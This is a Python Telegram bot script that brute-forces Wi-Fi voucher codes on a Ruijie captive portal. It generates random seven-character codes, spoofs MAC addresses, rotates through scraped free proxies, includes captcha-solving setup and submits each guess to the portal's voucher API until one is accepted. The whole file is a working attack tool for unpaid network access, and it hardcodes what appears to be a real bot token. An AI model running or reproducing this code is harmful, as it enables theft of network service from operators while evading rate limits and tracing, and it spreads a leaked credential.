#!/usr/bin/env python3
# KHEANG - Ruijie Auto-Proxy Telegram Bot (Integrated for LO)[span_3](start_span)[span_3](end_span)

import logging
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector
import random
import string
import urllib.parse
import ddddocr
import cv2
import numpy as np
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# Telegram Bot Token (ကိုယ့် Bot Token ထည့်ရန်)
TELEGRAM_BOT_TOKEN = "8648844261:AAGohP2qqSsDzcVTM42V9adhb08hLvsCZbM"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TELEGRAM_BOT_TOKEN)
dp = Dispatcher()

# Alphanumeric Generator (rhciqq7 လိုမျိုး စာလုံးနဲ့ဂဏန်းရော 7 လုံးတွဲများကို ရှာဖွေရန်)
MIXED_CHARS = string.ascii_lowercase + string.digits

def generate_alphanumeric_codes(length=7):
    used = set()
    while True:
        code = ''.join(random.choice(MIXED_CHARS) for _ in range(length))
        if code not in used:
            used.add(code)
            yield code

# OCR Setup (From KHEANG Script)[span_4](start_span)[span_4](end_span)
try:
    ocr = ddddocr.DdddOcr(show_ad=False)
except:
    ocr = None

def solve_captcha(image_bytes):
    try:
        if not ocr:
            return "1234"
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        _, buffer = cv2.imencode('.png', img)
        return ocr.classification(buffer.tobytes()).upper()
    except:
        return "1234"

# 🟢 Auto Fetch Free Proxies from Public API
async def fetch_auto_proxies():
    proxy_urls = [
        "https://raw.githubusercontent.com/clashstash/proxy-list/main/all.txt",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://www.proxyscan.io/download?type=http"
    ]
    proxies = []
    async with aiohttp.ClientSession() as session:
        for url in proxy_urls:
            try:
                async with session.get(url, timeout=5) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        lines = text.splitlines()
                        for line in lines:
                            line = line.strip()
                            if line and ":" in line and not line.startswith("#"):
                                if not line.startswith("http"):
                                    line = f"http://{line}"
                                proxies.append(line)
            except:
                continue
    return list(set(proxies))

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "🔥 **Ruijie Auto-Proxy Bot Active for LO** 🔥\n\n"
        "Commands:\n"
        "`/scan [URL]` - Auto fetch proxies & scan alphanumeric vouchers (`rhciqq7` style)",
        parse_mode="Markdown"
    )

@dp.message(Command("scan"))
async def cmd_scan(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ Please provide the target URL!\nFormat: `/scan [URL]`", parse_mode="Markdown")
        return
    
    target_url = args[1].strip()
    await message.answer("🔄 Fetching live proxies automatically...", parse_mode="Markdown")
    
    proxies = await fetch_auto_proxies()
    if not proxies:
        await message.answer("⚠️ Could not fetch auto proxies, running on direct connection...")
        proxies = [None]
    else:
        await message.answer(f"✅ Loaded {len(proxies)} proxies automatically. Starting scan...", parse_mode="Markdown")

    # Parse URL parameters
    parsed_url = urllib.parse.urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    query_params = dict(urllib.parse.parse_qsl(parsed_url.query))
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    code_gen = generate_alphanumeric_codes(length=7)
    checked = 0
    found = False
    
    # Pick a random proxy from the auto-fetched list
    selected_proxy = random.choice(proxies) if proxies else None
    
    connector = None
    if selected_proxy and selected_proxy.startswith("socks"):
        try:
            connector = ProxyConnector.from_url(selected_proxy)
        except:
            connector = aiohttp.TCPConnector(limit=50, force_close=True)
    else:
        connector = aiohttp.TCPConnector(limit=50, force_close=True)

    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(300): # စမ်းသပ်မည့် အရေအတွက်
            if found:
                break
            code = next(code_gen)
            checked += 1
            
            try:
                mac = ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))
                session_req_url = target_url.replace(f"mac={query_params.get('mac', '')}", f"mac={mac}")
                
                async with session.get(session_req_url, timeout=4) as resp:
                    sid_match = urllib.parse.parse_qs(urllib.parse.urlparse(str(resp.url)).query)
                    session_id = sid_match.get('sessionId', ['mock_sid'])[0]
                
                payload = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": "1234"
                }
                payload.update(query_params)
                
                async with session.post(post_url, json=payload, timeout=4) as post_resp:
                    result_text = await post_resp.text()
                    
                    if 'success' in result_text or 'logonUrl' in result_text or 'token' in result_text:
                        found = True
                        await message.answer(f"✅ **SUCCESS! Valid Voucher Found:** `{code}`", parse_mode="Markdown")
                        break
            except Exception:
                # Rotate proxy if error occurs
                if proxies:
                    selected_proxy = random.choice(proxies)
                continue
                
            await asyncio.sleep(0.05)
            
    if not found:
        await message.answer(f"🏁 Scan finished. Checked {checked} codes using proxy: `{selected_proxy if selected_proxy else 'Direct'}`")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
